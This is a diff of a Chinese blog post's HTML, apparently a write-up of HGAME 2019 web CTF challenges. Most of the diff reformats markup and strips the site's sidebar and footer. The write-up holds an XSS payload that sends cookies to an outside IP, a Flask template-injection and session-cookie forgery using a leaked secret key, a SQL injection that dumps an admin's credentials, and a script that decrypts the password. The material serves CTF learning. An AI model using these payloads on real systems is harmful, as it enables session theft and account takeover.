+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;e4616b38e22d1a22cedc53a90cfaa87f75ccbfe565399857a390950a58a94e68&#125;</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="BabyXss">
+          <a href="#BabyXss" class="heading-link"><i class="fas fa-link"></i></a>BabyXss</h2>
+      <p>题目环境有点问题</p>
 <!-- <scr<script>ipt>$.get('http://120.77.176.134/?cookie=' + document.cookie);</scr<script>ipt> -->
-<h1 id="WEEK-4"><a href="#WEEK-4" class="headerlink" title="WEEK-4"></a>WEEK-4</h1><h2 id="happypython"><a href="#happypython" class="headerlink" title="happypython"></a>happypython</h2><p>python下的ssti，自己当时做的时候想到了要获取secret_key的思路，但是可惜没想到ssti，自己对框架相关问题了解的太少了，以后要在这方面加强一下，简单测试一下可以发现该框架是存在模板注入的问题的<code>http://118.25.18.223:3001/{{1+1}}</code></p>
-<p><img src="https://i.loli.net/2019/02/26/5c7529f34783c.png" alt=""></p>
+
+        <h1 id="WEEK-4">
+          <a href="#WEEK-4" class="heading-link"><i class="fas fa-link"></i></a>WEEK-4</h1>
+      
+        <h2 id="happypython">
+          <a href="#happypython" class="heading-link"><i class="fas fa-link"></i></a>happypython</h2>
+      <p>python下的ssti，自己当时做的时候想到了要获取secret_key的思路，但是可惜没想到ssti，自己对框架相关问题了解的太少了，以后要在这方面加强一下，简单测试一下可以发现该框架是存在模板注入的问题的<code>http://118.25.18.223:3001/{{1+1}}</code></p>
+<p><img src="https://i.loli.net/2019/02/26/5c7529f34783c.png" alt></p>
 <p>接下来读取配置文件<code>http://118.25.18.223:3001/{{config}}</code>，可以获取到secret_key</p>
-<p><img src="https://i.loli.net/2019/02/26/5c752a50e3200.png" alt=""></p>
+<p><img src="https://i.loli.net/2019/02/26/5c752a50e3200.png" alt></p>
 <p>解一下cookie</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python session.py decode -c .eJwlj0FqQzEMBe_idRaSLMl2LvORZYmGQAv_J6vSu8fQ1ayGee-3HHnG9VXur_Mdt3I8VrkXEETAdKvkc1EbK5fG0D4oXKR3DND0qSbUGy1gHwTeONI8RxCLVOWuWmU2iC27qzNrwuSKCpDTbCipEfQxyY3Fos2-nGKWW_HrzOP184zvvUexCUtm3wzlXRAbKQwzrCOtMJJel2zvfcX5fwIRy98HJ4Y_iA.XHUmGA.wO2v6jNOPBHknlA5tAqik2bE_hI -s 9RxdzNwq7!nOoK3*</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;u&apos;csrf_token&apos;: u&apos;617545ff8175e64f9e5a9f540bea812dea2583d5&apos;, u&apos;_fresh&apos;: True, u&apos;user_id&apos;: u&apos;111&apos;, u&apos;_id&apos;: u&apos;051101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a2089b2ca45ae7b8dc2eb&apos;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python session.py decode -c .eJwlj0FqQzEMBe_idRaSLMl2LvORZYmGQAv_J6vSu8fQ1ayGee-3HHnG9VXur_Mdt3I8VrkXEETAdKvkc1EbK5fG0D4oXKR3DND0qSbUGy1gHwTeONI8RxCLVOWuWmU2iC27qzNrwuSKCpDTbCipEfQxyY3Fos2-nGKWW_HrzOP184zvvUexCUtm3wzlXRAbKQwzrCOtMJJel2zvfcX5fwIRy98HJ4Y_iA.XHUmGA.wO2v6jNOPBHknlA5tAqik2bE_hI -s 9RxdzNwq7!nOoK3*</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;u&#39;csrf_token&#39;: u&#39;617545ff8175e64f9e5a9f540bea812dea2583d5&#39;, u&#39;_fresh&#39;: True, u&#39;user_id&#39;: u&#39;111&#39;, u&#39;_id&#39;: u&#39;051101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a2089b2ca45ae7b8dc2eb&#39;&#125;</span><br></pre></td></tr></table></div></figure>
 <p>猜测user_id可能代表的是用户id，猜测admin的用户ID为1，修改一下id为1伪造cookie</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python session_cookie_manager.py encode -s 9RxdzNwq7!nOoK3* -t &#123;&apos;csrf_token&apos;:&apos;617545ff8175e64f9e5a9f540bea812dea2583d5&apos;,&apos;_fresh&apos;:True,&apos;user_id&apos;:&apos;1&apos;,&apos;_id&apos;:&apos;0 51101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a208 9b2ca45ae7b8dc2eb&apos;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python session_cookie_manager.py encode -s 9RxdzNwq7!nOoK3* -t &#123;&#39;csrf_token&#39;:&#39;617545ff8175e64f9e5a9f540bea812dea2583d5&#39;,&#39;_fresh&#39;:True,&#39;user_id&#39;:&#39;1&#39;,&#39;_id&#39;:&#39;0 51101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a208 9b2ca45ae7b8dc2eb&#39;&#125;</span><br></pre></td></tr></table></div></figure>
 <p>然后将生成的cookie覆盖原来cookie即可得到flag</p>
-<p><img src="https://i.loli.net/2019/02/26/5c752b920389a.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Qu_bu_la1_m1ng_z1_14&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/02/26/5c752b920389a.png" alt></p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Qu_bu_la1_m1ng_z1_14&#125;</span><br></pre></td></tr></table></div></figure>
 <p>ps: 这题我入了一个坑点，在伪造cookie的时候，命令行下老是报错<code>ValueError: dictionary update sequence element #0 has length 1; 2 is required</code>，查看了一下代码发现是在dict()函数处报错的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br></pre></td></tr></table></div></figure>
 <p>但是同样的代码在linux下就可以正常运行，测试了一下发现在windows下dict的参数其实是类似于<code>{aa:aa}</code>，而linux下却是<code>{&#39;aa&#39;:&#39;aa&#39;}</code>，命令行输入是完全相同的，显然windows下的参数无法正确执行，经过研究发现是<code>&quot;</code>捣的鬼，在windows下我们输入的<code>&quot;</code>是不会被捕获的，只会捕获双引号里面的内容，而单引号不存在这个问题，如果想要输入双引号必须要反斜杠转义，举个例子</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    print(sys.argv[i])</span><br></pre></td></tr></table></figure>
-<p>我们输入<code>python b.py &quot;key&quot;:&quot;value&quot; &#39;key&#39;:&#39;value&#39; \&quot;\&#39;</code>，此时输出为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b.py</span><br><span class="line">key:value</span><br><span class="line">&apos;key&apos;:&apos;value&apos;</span><br><span class="line">&quot;\&apos;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    print(sys.argv[i])</span><br></pre></td></tr></table></div></figure>
+<p>我们输入<code>python b.py &quot;key&quot;:&quot;value&quot; &#39;key&#39;:&#39;value&#39; \&quot;\&#39;</code>，此时输出为<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b.py</span><br><span class="line">key:value</span><br><span class="line">&#39;key&#39;:&#39;value&#39;</span><br><span class="line">&quot;\&#39;</span><br></pre></td></tr></table></div></figure></p>
 <p>这就是区别，应该是windows特性的问题，自己被坑了好久还以为自己做的不对（泪奔~~~~~）</p>
-<h2 id="happyPHP"><a href="#happyPHP" class="headerlink" title="happyPHP"></a>happyPHP</h2><p>正常注册之后登录，查看源代码可以得到项目源代码<code>!--https://github.com/Lou00/laravel--&gt;</code></p>
+
+        <h2 id="happyPHP">
+          <a href="#happyPHP" class="heading-link"><i class="fas fa-link"></i></a>happyPHP</h2>
+      <p>正常注册之后登录，查看源代码可以得到项目源代码<code>!--https://github.com/Lou00/laravel--&gt;</code></p>
 <p>审计代码时，一般应该从路由开始看起，看一共有哪些页面，实现了哪些功能，对于laraval来说，我们先从routes/web.php开始审计</p>
-<p><img src="https://i.loli.net/2019/02/27/5c75e272afb23.png" alt=""></p>
+<p><img src="https://i.loli.net/2019/02/27/5c75e272afb23.png" alt></p>
 <p>可以看到实现的路由，例如对第一行来说，表示的意思就是将根目录发送给StaticPagesController控制器下的home方法进行解析，name方法用来命令路由，便于后期的维护。</p>
 <p>app中的文件是框架的核心控制部分，我们查看一下该部分看看，在SessionController.php中发现了问题</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Auth::attempt($credentials)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Auth::user()-&gt;id ===<span class="number">1</span>)&#123;</span><br><span class="line">        session()-&gt;flash(<span class="string">'info'</span>,<span class="string">'flag :******'</span>);</span><br><span class="line">        <span class="keyword">return</span> redirect()-&gt;route(<span class="string">'users.show'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $name = DB::select(<span class="string">"SELECT name FROM `users` WHERE `name`='"</span>.Auth::user()-&gt;name.<span class="string">"'"</span>);</span><br><span class="line">    session()-&gt;flash(<span class="string">'info'</span>, <span class="string">'hello '</span>.$name[<span class="number">0</span>]-&gt;name);</span><br><span class="line">    <span class="keyword">return</span> redirect()-&gt;route(<span class="string">'users.show'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Auth::attempt($credentials)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Auth::user()-&gt;id ===<span class="number">1</span>)&#123;</span><br><span class="line">        session()-&gt;flash(<span class="string">'info'</span>,<span class="string">'flag :******'</span>);</span><br><span class="line">        <span class="keyword">return</span> redirect()-&gt;route(<span class="string">'users.show'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $name = DB::select(<span class="string">"SELECT name FROM `users` WHERE `name`='"</span>.Auth::user()-&gt;name.<span class="string">"'"</span>);</span><br><span class="line">    session()-&gt;flash(<span class="string">'info'</span>, <span class="string">'hello '</span>.$name[<span class="number">0</span>]-&gt;name);</span><br><span class="line">    <span class="keyword">return</span> redirect()-&gt;route(<span class="string">'users.show'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
 <p>可以看到此处存在sql语句，在laraval中有更加安全的sql查询方式，这儿显然存在问题的，存在sql注入问题，我们可以注册一个用户名为<code>&#39; union select group_concat(email,password) from users where id=1#</code>，然后登录即可获得该用户的email和密码（因为题目要求id=1的用户登录才可以得到flag），</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin@hgame.comeyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ==</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin@hgame.comeyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ&#x3D;&#x3D;</span><br></pre></td></tr></table></div></figure>
 <p>密码是经过加密的，解密一下</p>
 <blockquote>
 <p>{“iv”:”rnVrqfCvfJgnvSTi9z7KLw==”,”value”:”EaR/4fldOGP1G/aDK8e8u1Aldmxl+yB3s+kBAaoPods=”,”mac”:”56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af”}</p>
 </blockquote>
-<p>查看配置文件可以发现使用了aes加密，但是key值不知道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;key&apos; =&gt; env(&apos;APP_KEY&apos;),</span><br><span class="line">&apos;cipher&apos; =&gt; &apos;AES-256-CBC&apos;,</span><br></pre></td></tr></table></figure></p>
+<p>查看配置文件可以发现使用了aes加密，但是key值不知道<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;key&#39; &#x3D;&gt; env(&#39;APP_KEY&#39;),</span><br><span class="line">&#39;cipher&#39; &#x3D;&gt; &#39;AES-256-CBC&#39;,</span><br></pre></td></tr></table></div></figure></p>
 <p>回滚git版本找到key值</p>
 <blockquote>
 <p>APP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=</p>
 </blockquote>
-<p>接下来编写解密脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">iv = <span class="string">'rnVrqfCvfJgnvSTi9z7KLw=='</span></span><br><span class="line">value = <span class="string">'EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods='</span></span><br><span class="line">enc = <span class="string">'9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='</span></span><br><span class="line">enc = base64.b64decode(enc)</span><br><span class="line">iv = base64.b64decode(iv)</span><br><span class="line">value = base64.b64decode(value)</span><br><span class="line">cryptor = AES.new(enc,AES.MODE_CBC,iv)</span><br><span class="line">con = cryptor.decrypt(value)</span><br><span class="line"><span class="keyword">print</span> con</span><br></pre></td></tr></table></figure></p>
+<p>接下来编写解密脚本<br><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">iv = <span class="string">'rnVrqfCvfJgnvSTi9z7KLw=='</span></span><br><span class="line">value = <span class="string">'EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods='</span></span><br><span class="line">enc = <span class="string">'9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='</span></span><br><span class="line">enc = base64.b64decode(enc)</span><br><span class="line">iv = base64.b64decode(iv)</span><br><span class="line">value = base64.b64decode(value)</span><br><span class="line">cryptor = AES.new(enc,AES.MODE_CBC,iv)</span><br><span class="line">con = cryptor.decrypt(value)</span><br><span class="line"><span class="keyword">print</span> con</span><br></pre></td></tr></table></div></figure></p>
 <p>可以得到密码为<code>9pqfPIer0Ir9UUfR</code>，登录即可得到flag</p>
-<p><img src="https://i.loli.net/2019/02/27/5c75f88d0fb45.png" alt=""></p>
+<p><img src="https://i.loli.net/2019/02/27/5c75f88d0fb45.png" alt></p>
 <p><strong><em>Reference：</em></strong></p>
 <ol>
-<li><a href="https://xz.aliyun.com/t/3161" target="_blank" rel="noopener">https://xz.aliyun.com/t/3161</a></li>
-<li><a href="https://zry.io/archives/183" target="_blank" rel="noopener">https://zry.io/archives/183</a></li>
+<li><span class="exturl"><a class="exturl__link" href="https://xz.aliyun.com/t/3161" target="_blank" rel="noopener">https://xz.aliyun.com/t/3161</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
+<li><span class="exturl"><a class="exturl__link" href="https://zry.io/archives/183" target="_blank" rel="noopener">https://zry.io/archives/183</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
 </ol>
-
-      
-    </div>
-
-    
-
-    
-    
-    
-
-  <div>
-    
-      <div>
-    
-        <div style="text-align:center;color: #4b4b4b;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
-    
-</div>
-    
-  </div>
-
-    
-
-    
-      
-    
-    
-      <div>
-        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
-  <div>您今天怎么辣么迷人！</div>
-  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
-    <span>Donate</span>
-  </button>
-  <div id="QR" style="display: none;">
-
-    
-      <div id="wechat" style="display: inline-block">
-        <img id="wechat_qr" src="/images/reward-wechat.png" alt="Aesm1p WeChat Pay"/>
-        <p>WeChat Pay</p>
-      </div>
-    
-
-    
-      <div id="alipay" style="display: inline-block">
-        <img id="alipay_qr" src="/images/reward-alipay.jpg" alt="Aesm1p Alipay"/>
-        <p>Alipay</p>
-      </div>
-    
-
-    
-
-  </div>
-</div>
-
-      </div>
-    
-
-    
-      <div>
-        
-
-
-
-  
-
-
-
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>Post author:  </strong>Aesm1p</li>
-  <li class="post-copyright-link">
-    <strong>Post link: </strong>
-    
-    <a href="http://chaosec.top/2019/03/02/hgame2019b/" title="HGAME2019-Web-Week3&4">http://chaosec.top/2019/03/02/hgame2019b/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.</li>
-</ul>
-
-      </div>
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/CTF/" rel="tag"># CTF</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/03/02/xss20/" rel="next" title="XSS20冲关之旅">
-                <i class="fa fa-chevron-left"></i> XSS20冲关之旅
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/08/kaoyan/" rel="prev" title="Unknown Article">
-                Unknown Article <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image"
-                src="/images/avatar.jpg"
-                alt="Aesm1p"/>
-            
-              <p class="site-author-name" itemprop="name">Aesm1p</p>
-              <p class="site-description motion-element" itemprop="description">相逢意气为君饮</p>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
-                
-                  <a href="/archives">
-                
-                    <span class="site-state-item-count">34</span>
-                    <span class="site-state-item-name">posts</span>
-                  </a>
-                </div>
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-categories">
-                  <a href="/categories/index-2.html">
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">6</span>
-                    <span class="site-state-item-name">categories</span>
-                  </a>
-                </div>
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-tags">
-                  <a href="/tags/index.html">
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">16</span>
-                    <span class="site-state-item-name">tags</span>
-                  </a>
-                </div>
-              
-            </nav>
-          
-
-          
-            <div class="feed-link motion-element">
-              <a href="/atom.xml" rel="alternate">
-                <i class="fa fa-rss"></i>
-                RSS
-              </a>
-            </div>
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/PPointCharles" title="GitHub &rarr; https://github.com/PPointCharles" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i></a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                  
-                    
-                  
-                  <a href="mailto:1426594174@qq.com" title="E-Mail &rarr; mailto:1426594174@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
-                </span>
-              
-            </div>
-          
-
-          
-             <div class="cc-license motion-element" itemprop="license">
-              
-                
-              
-              
-              
-              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"/></a>
-             </div>
-          
-
-          
-          
-
-          
-            
-          
-          
-
-        </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#week-3"><span class="nav-number">1.</span> <span class="nav-text"><a href="#week-3" class="headerlink" title="week-3"></a>week-3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#神奇的MD5"><span class="nav-number">1.1.</span> <span class="nav-text"><a href="#&#x795E;&#x5947;&#x7684;MD5" class="headerlink" title="&#x795E;&#x5947;&#x7684;MD5"></a>&#x795E;&#x5947;&#x7684;MD5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqli-1"><span class="nav-number">1.2.</span> <span class="nav-text"><a href="#sqli-1" class="headerlink" title="sqli-1"></a>sqli-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqli-2"><span class="nav-number">1.3.</span> <span class="nav-text"><a href="#sqli-2" class="headerlink" title="sqli-2"></a>sqli-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基础渗透"><span class="nav-number">1.4.</span> <span class="nav-text"><a href="#&#x57FA;&#x7840;&#x6E17;&#x900F;" class="headerlink" title="&#x57FA;&#x7840;&#x6E17;&#x900F;"></a>&#x57FA;&#x7840;&#x6E17;&#x900F;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BabyXss"><span class="nav-number">1.5.</span> <span class="nav-text"><a href="#BabyXss" class="headerlink" title="BabyXss"></a>BabyXss</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEEK-4"><span class="nav-number">2.</span> <span class="nav-text"><a href="#WEEK-4" class="headerlink" title="WEEK-4"></a>WEEK-4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#happypython"><span class="nav-number">2.1.</span> <span class="nav-text"><a href="#happypython" class="headerlink" title="happypython"></a>happypython</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#happyPHP"><span class="nav-number">2.2.</span> <span class="nav-text"><a href="#happyPHP" class="headerlink" title="happyPHP"></a>happyPHP</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </div>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Aesm1p</span>
-
-  
-
-  
-</div>
-
-
-
-
-
-
-
-
-
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-  
-    <span class="post-meta-item-icon">
-      <i class="fa fa-user"></i>
-    </span>
-    <span class="site-uv" title="Total Visitors">
-      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
-    </span>
-  
-
-  
-    <span class="post-meta-divider">|</span>
-  
-
-  
-    <span class="post-meta-item-icon">
-      <i class="fa fa-eye"></i>
-    </span>
-    <span class="site-pv" title="Total Views">
-      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
-    </span>
-  
-</div>
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-    
-
-    
-  </div>
-
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://chaosec.top">Aesm1p</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://chaosec.top/2019/03/02/hgame2019b/">http://chaosec.top/2019/03/02/hgame2019b/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://chaosec.top/tags/CTF/">CTF</a></span></div><div class="post-reward reward"><div class="reward-button">Buy me a coffee</div><div class="reward-qrcode"><span class="reward-qrcode-alipay"><img class="reward-qrcode-alipay__img" src="/assets/reward-alipay.jpg"><div class="reward-qrcode-alipay__text">Alipay</div></span><span class="reward-qrcode-wechat"><img class="reward-qrcode-wechat__img" src="/assets/reward-wechat.png"><div 